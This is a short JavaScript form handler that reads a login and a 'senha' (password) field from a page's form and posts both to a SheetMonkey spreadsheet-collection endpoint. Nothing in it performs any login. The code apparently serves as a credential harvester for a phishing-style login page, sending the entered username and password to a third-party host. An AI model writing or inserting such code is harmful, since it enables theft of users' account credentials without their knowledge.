
const handleSubmit = (event) => {

    event.preventDefault();
    const login = document.querySelector('input[name = login]').value;
    const senha = document.querySelector('input[name = senha]').value;


    fetch('https://api.sheetmonkey.io/form/apxVoYvGyrA6sR21KBeWv6', {

        method: 'post',
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ login, senha }),
    });
}
document.querySelector(".form").addEventListener('submit', handleSubmit);